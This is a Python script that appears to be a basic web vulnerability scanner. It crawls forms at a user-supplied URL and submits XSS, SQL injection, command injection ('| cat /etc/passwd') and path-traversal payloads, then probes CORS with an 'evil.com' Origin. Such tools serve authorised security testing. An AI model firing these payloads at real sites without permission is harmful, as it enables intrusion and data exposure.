import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

# ===============================
# Payloads for different attacks
# ===============================
payloads = {
    "XSS": ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>"],
    "SQLi": ["' OR '1'='1", "\" OR \"1\"=\"1", "';--"],
    "Command Injection": ["; ls", "&& whoami", "| cat /etc/passwd"],
    "Path Traversal": ["../../etc/passwd", "..%2f..%2f..%2fetc/passwd"]
}

# Regex signatures for detection
error_signatures = {
    "SQLi": ["sql syntax", "mysql", "ORA-", "sqlite", "unexpected end of SQL"],
    "Command Injection": ["root:x", "bin/bash", "uid="],
    "Path Traversal": ["root:x", "boot:", "home:"]
}

# Severity levels
severity_levels = {
    "XSS": "High",
    "SQLi": "High",
    "Command Injection": "Critical",
    "Path Traversal": "High",
    "CORS": "Medium"
}

def crawl_forms(url):
    """Find forms on a page"""
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[!] Error crawling {url}: {e}")
        return []

def test_xss(form, url):
    results = []
    for payload in payloads["XSS"]:
        data = {}
        for inp in form.find_all("input"):
            if inp.get("type") == "text" and inp.get("name"):
                data[inp.get("name")] = payload
            elif inp.get("name"):
                data[inp.get("name")] = "test"

        action = form.get("action") or url
        method = form.get("method", "get").lower()
        target = urljoin(url, action)

        try:
            if method == "post":
                res = requests.post(target, data=data, timeout=5)
            else:
                res = requests.get(target, params=data, timeout=5)

            if payload in res.text:
                results.append({
                    "vuln_type": "XSS",
                    "target": target,
                    "payload": payload,
                    "evidence": payload,
                    "severity": severity_levels["XSS"]
                })
        except:
            pass
    return results

def test_injections(url, form):
    results = []
    for vuln_type, pl_list in payloads.items():
        if vuln_type == "XSS":
            continue
        for payload in pl_list:
            data = {}
            for inp in form.find_all("input"):
                if inp.get("type") == "text" and inp.get("name"):
                    data[inp.get("name")] = payload
                elif inp.get("name"):
                    data[inp.get("name")] = "test"

            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)

            try:
                if method == "post":
                    res = requests.post(target, data=data, timeout=5)
                else:
                    res = requests.get(target, params=data, timeout=5)

                # Detection using regex
                if vuln_type in error_signatures:
                    for sig in error_signatures[vuln_type]:
                        if re.search(sig, res.text, re.IGNORECASE):
                            results.append({
                                "vuln_type": vuln_type,
                                "target": target,
                                "payload": payload,
                                "evidence": sig,
                                "severity": severity_levels[vuln_type]
                            })

                if vuln_type == "Path Traversal" and "root:x" in res.text:
                    results.append({
                        "vuln_type": "Path Traversal",
                        "target": target,
                        "payload": payload,
                        "evidence": "passwd file content",
                        "severity": severity_levels["Path Traversal"]
                    })
            except:
                pass
    return results

def test_cors(url):
    try:
        headers = {"Origin": "http://evil.com"}
        res = requests.get(url, headers=headers, timeout=5)
        if "Access-Control-Allow-Origin" in res.headers:
            if res.headers["Access-Control-Allow-Origin"] == "*" or "evil.com" in res.headers["Access-Control-Allow-Origin"]:
                return {
                    "vuln_type": "CORS",
                    "target": url,
                    "payload": "Origin header test",
                    "evidence": res.headers["Access-Control-Allow-Origin"],
                    "severity": severity_levels["CORS"]
                }
    except:
        return None
    return None

def main(url):
    print(f"[*] Scanning {url} ...")
    forms = crawl_forms(url)
    if not forms:
        print("[!] No forms found.")
        return

    all_vulns = []

    # Test XSS
    for form in forms:
        xss_results = test_xss(form, url)
        all_vulns.extend(xss_results)

    # Test SQLi, Command Injection, Path Traversal
    for form in forms:
        inj_results = test_injections(url, form)
        all_vulns.extend(inj_results)

    # Test CORS
    cors_result = test_cors(url)
    if cors_result:
        all_vulns.append(cors_result)

    # Print all results with evidence and severity
    for vuln in all_vulns:
        print(f"[{vuln['vuln_type']}] Vulnerable at {vuln['target']} | "
              f"Payload: {vuln['payload']} | Evidence: {vuln['evidence']} | "
              f"Severity: {vuln['severity']}")

    print("[*] Scan complete.")

if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    main(target_url)
